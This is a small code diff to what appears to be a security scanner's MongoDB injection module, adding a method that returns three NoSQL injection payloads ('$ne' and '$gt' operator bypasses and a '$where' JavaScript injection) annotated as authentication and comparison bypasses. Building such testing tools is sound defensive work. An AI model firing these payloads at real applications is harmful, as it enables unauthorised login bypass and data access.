@@ -27,6 +27,13 @@ class MongoInjector(BaseInjector):
         r"unrecognized expression",
     ]
 
+    def generate_quick_payloads(self, context: dict) -> list[str]:
+        return [
+            '{"$ne": ""}',              # operator injection / auth bypass
+            '{"$gt": ""}',              # comparison bypass
+            '{"$where": "1==1"}',       # JavaScript injection
+        ]
+
     def generate_payloads(self, context: dict) -> list[str]:
         return [
             # ── Operator injection (query parameter pollution) ──
